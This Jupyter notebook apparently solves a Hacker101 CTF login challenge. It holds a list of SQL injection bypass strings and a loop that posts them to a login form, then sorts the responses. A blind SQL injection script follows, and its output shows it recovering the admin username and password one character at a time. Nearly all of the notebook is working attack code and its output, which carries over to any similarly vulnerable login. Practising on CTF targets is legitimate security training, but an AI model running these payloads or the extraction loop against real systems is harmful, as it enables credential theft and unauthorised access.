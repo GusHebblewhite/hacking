{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "I1VUkmdBvQLU"
   },
   "source": [
    "# Setup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/"
    },
    "id": "W_EmpaU7dp9l",
    "outputId": "397d65a5-ed33-4619-feb8-82bb956843f0"
   },
   "outputs": [],
   "source": [
    "#Grab the file with basic SQL Injections\n",
    "SQLI_basic_path = \"../../library/text_files/SQL_bypass.txt\"\n",
    "\n",
    "with open(SQLI_basic_path, \"r\") as f:\n",
    "    SQLI = f.readlines()\n",
    "SQLI = [x.replace(\"\\n\", \"\") for x in SQLI]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import time\n",
    "from tqdm import tqdm\n",
    "\n",
    "URL = \"http://34.94.3.143/7a0dd395ea/login\"\n",
    "#From https://ctf.hacker101.com/ctf"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "QESklmT3ve-d"
   },
   "source": [
    "# First Pass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "id": "RjRbiddh4szN"
   },
   "outputs": [],
   "source": [
    "SQLI_un_arr = SQLI\n",
    "SQLI_pw_arr = [\"\"]\n",
    "results = []\n",
    "\n",
    "#Try every combination of username and passwords\n",
    "for SQLI_un in SQLI_un_arr:\n",
    "    for SQLI_pw in SQLI_pw_arr:\n",
    "\n",
    "        #Post request\n",
    "        data = {'username': SQLI_un, 'password': SQLI_pw}\n",
    "        r = requests.post(URL, data=data)\n",
    "\n",
    "        results.append({'un' : SQLI_un, 'pw' : SQLI_pw, 'response' : r, 'text' : r.text})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "id": "AerJ6CW2AoNK"
   },
   "outputs": [],
   "source": [
    "results_breakdown = {\"sql_u\":[], \"sql_p\":[], \"unk_u\":[], \"inv_p\":[], \"other\":[]}\n",
    "for q in results:\n",
    "    response_text = q['text']\n",
    "\n",
    "    #SQL Error Username\n",
    "    if \"SELECT password FROM admins WHERE username\" in response_text:\n",
    "        results_breakdown[\"sql_u\"].append(q['un'])\n",
    "\n",
    "    #Unknown User\n",
    "    elif \"Unknown user\" in response_text:\n",
    "        results_breakdown[\"unk_u\"].append(q['un'])\n",
    "\n",
    "    #Invalid Password\n",
    "    elif \"Invalid password\" in response_text:\n",
    "        results_breakdown[\"inv_p\"].append(q['un'])\n",
    "\n",
    "    #Other (Success?)`\n",
    "    else:\n",
    "        results_breakdown[\"other\"].append(q)\n",
    "        \n",
    "    if \"FLAG\" in r.text:\n",
    "        print(\"Flag detected\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'sql_u': [\"' or true--\",\n",
       "  \"') or true--\",\n",
       "  \"') or ('x')=('x\",\n",
       "  \"')) or (('x'))=(('x\",\n",
       "  \"admin' --\",\n",
       "  \"admin'/*\",\n",
       "  \"admin' or '1'='1'--\",\n",
       "  \"admin' or '1'='1'/*\",\n",
       "  \"admin' or 1=1\",\n",
       "  \"admin' or 1=1--\",\n",
       "  \"admin' or 1=1/*\",\n",
       "  \"admin') or ('1'='1\",\n",
       "  \"admin') or ('1'='1'--\",\n",
       "  \"admin') or ('1'='1'#\",\n",
       "  \"admin') or ('1'='1'/*\",\n",
       "  \"admin') or '1'='1\",\n",
       "  \"admin') or '1'='1'--\",\n",
       "  \"admin') or '1'='1'#\",\n",
       "  \"admin') or '1'='1'/*\",\n",
       "  \"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\"],\n",
       " 'sql_p': [],\n",
       " 'unk_u': [\"' '\",\n",
       "  \"' or ''-'\",\n",
       "  \"' or '' '\",\n",
       "  \"' or ''&'\",\n",
       "  \"' or ''^'\",\n",
       "  \"' or ''*'\",\n",
       "  '\"-\"',\n",
       "  '\" \"',\n",
       "  '\"&\"',\n",
       "  '\"^\"',\n",
       "  '\"*\"',\n",
       "  '\" or \"\"-\"',\n",
       "  '\" or \"\" \"',\n",
       "  '\" or \"\"&\"',\n",
       "  '\" or \"\"^\"',\n",
       "  '\" or \"\"*\"',\n",
       "  'or true--',\n",
       "  '\" or true--',\n",
       "  '\") or true--',\n",
       "  '\" or \"x\"=\"x',\n",
       "  '\") or (\"x\")=(\"x',\n",
       "  '\")) or ((\"x\"))=((\"x',\n",
       "  'or 1=1',\n",
       "  'or 1=1--',\n",
       "  'or 1=1#',\n",
       "  'or 1=1/*',\n",
       "  \"admin' #\",\n",
       "  'admin\" --',\n",
       "  'admin\" #',\n",
       "  'admin\"/*',\n",
       "  'admin\" or \"1\"=\"1',\n",
       "  'admin\" or \"1\"=\"1\"--',\n",
       "  'admin\" or \"1\"=\"1\"#',\n",
       "  'admin\" or \"1\"=\"1\"/*',\n",
       "  'admin\"or 1=1 or \"\"=\"',\n",
       "  'admin\" or 1=1',\n",
       "  'admin\" or 1=1--',\n",
       "  'admin\" or 1=1#',\n",
       "  'admin\" or 1=1/*',\n",
       "  'admin\") or (\"1\"=\"1',\n",
       "  'admin\") or (\"1\"=\"1\"--',\n",
       "  'admin\") or (\"1\"=\"1\"#',\n",
       "  'admin\") or (\"1\"=\"1\"/*',\n",
       "  'admin\") or \"1\"=\"1',\n",
       "  'admin\") or \"1\"=\"1\"--',\n",
       "  'admin\") or \"1\"=\"1\"#',\n",
       "  'admin\") or \"1\"=\"1\"/*',\n",
       "  '1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055'],\n",
       " 'inv_p': [\"'-'\",\n",
       "  \"'&'\",\n",
       "  \"'^'\",\n",
       "  \"'*'\",\n",
       "  \"' or 'x'='x\",\n",
       "  \"admin' or '1'='1\",\n",
       "  \"admin' or '1'='1'#\",\n",
       "  \"admin'or 1=1 or ''='\",\n",
       "  \"admin' or 1=1#\"],\n",
       " 'other': []}"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "results_breakdown"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/"
    },
    "id": "a5SwwDp8hPmt",
    "outputId": "edb8f738-6e7f-47f1-f9cf-a2aa74f934dc"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "sql_u : 20\n",
      "sql_p : 0\n",
      "unk_u : 48\n",
      "inv_p : 9\n",
      "other : 0\n"
     ]
    }
   ],
   "source": [
    "#Counts\n",
    "for each_key in results_breakdown.keys():\n",
    "    print(f\"{each_key} : {len(results_breakdown[each_key])}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/"
    },
    "id": "xQL_Tklsezy8",
    "outputId": "43b94d6b-22ea-410a-abf2-5098e1777374"
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'-'\",\n",
       " \"'&'\",\n",
       " \"'^'\",\n",
       " \"'*'\",\n",
       " \"' or 'x'='x\",\n",
       " \"admin' or '1'='1\",\n",
       " \"admin' or '1'='1'#\",\n",
       " \"admin'or 1=1 or ''='\",\n",
       " \"admin' or 1=1#\"]"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "results_breakdown[\"inv_p\"]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Result\n",
    "I'm currently not sure how to get any further with this approach. These usernames do not give access fully - the password check does not appear to be bypassed. None of these inputs bypass the password. Additionally I can't get the password check to throw an error, so I can't work out what the actual password query is. On to a different approach..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "_7rXsonxe7Jf"
   },
   "source": [
    "# Blind SQL Script\n",
    "So the basic gist here is that we can use the following input for username:\n",
    "\n",
    "```\n",
    "' OR 1=1 #\n",
    "```\n",
    "And replace the \"1=1\" with any statement about the database. If we get a response with \"unknown user\" then the statement was false, otherwise if we get an \"incorrect password\" then the statement was true.\n",
    "\n",
    "NB the SQL command that gets run is:\n",
    "\n",
    "```sql\n",
    "SELECT password \n",
    "FROM admins \n",
    "WHERE username= ...\n",
    "```\n",
    "```python\n",
    "'\\'%s\\'' % request.form['username'].replace('%', '%%')\n",
    "```\n",
    "\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Username"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "id": "KAcxrldOwITm",
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "e\n",
      "a\n",
      "r\n",
      "n\n",
      "e\n",
      "s\n",
      "t\n",
      "i\n",
      "n\n",
      "e\n",
      "earnestine\n"
     ]
    }
   ],
   "source": [
    "#NB this could be sped up with binary search\n",
    "#Assumes no whitespace\n",
    "\n",
    "#Loop through all characters to find admin username:\n",
    "import string\n",
    "\n",
    "username = \"\"\n",
    "idx = 0\n",
    "while(1):\n",
    "    found = 0\n",
    "    idx += 1\n",
    "    for each_letter in string.printable.strip():\n",
    "\n",
    "        statement_to_eval = f\"SUBSTRING(username, {idx}, 1) = \\'{each_letter}\\'\"\n",
    "        SQLI_un = f\"\\' OR {statement_to_eval} #\"\n",
    "        SQLI_pw = \"\"\n",
    "\n",
    "        #Post request\n",
    "        data = {'username': SQLI_un, 'password': SQLI_pw}\n",
    "        r = requests.post(URL, data=data)\n",
    "\n",
    "        if \"Invalid password\" in r.text:\n",
    "            #This means our query has resolved to True\n",
    "            print(each_letter)\n",
    "            username += each_letter\n",
    "            found = 1\n",
    "            break\n",
    "        elif \"Unknown user\" in r.text:\n",
    "            pass\n",
    "        else:\n",
    "            print(r.text)\n",
    "            \n",
    "    #Break if we didn't find a character (string is complete)\n",
    "    if found == 0:\n",
    "        break\n",
    "    \n",
    "print(username)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "d\n",
      "u\n",
      "s\n",
      "t\n",
      "i\n",
      "n\n",
      "dustin\n"
     ]
    }
   ],
   "source": [
    "#Loop through all characters to find admin password:\n",
    "import string\n",
    "\n",
    "password = \"\"\n",
    "idx = 0\n",
    "search = 1\n",
    "while(search):\n",
    "    found = 0\n",
    "    idx += 1\n",
    "    for each_letter in string.printable.strip():\n",
    "\n",
    "        statement_to_eval = f\"SUBSTRING(password, {idx}, 1) = \\'{each_letter}\\'\"\n",
    "        SQLI_un = f\"\\' OR {statement_to_eval} #\"\n",
    "        SQLI_pw = \"\"\n",
    "\n",
    "        #Post request\n",
    "        data = {'username': SQLI_un, 'password': SQLI_pw}\n",
    "        r = requests.post(URL, data=data)\n",
    "\n",
    "        if \"Invalid password\" in r.text:\n",
    "            #This means our query has resolved to True\n",
    "            print(each_letter)\n",
    "            password += each_letter\n",
    "            found = 1\n",
    "            break\n",
    "        elif \"Unknown user\" in r.text:\n",
    "            pass\n",
    "        else:\n",
    "            print(r.text)\n",
    "            \n",
    "    #Break if we didn't find a character (string is complete)\n",
    "    if found == 0:\n",
    "        search = 0\n",
    "    \n",
    "print(password)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Bypass attempt 2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "SQLI_un = \"' OR username = (SELECT username FROM admins LIMIT 1)#\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "colab": {
   "collapsed_sections": [],
   "name": "H1 Micro-CMS v2.ipynb",
   "provenance": []
  },
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
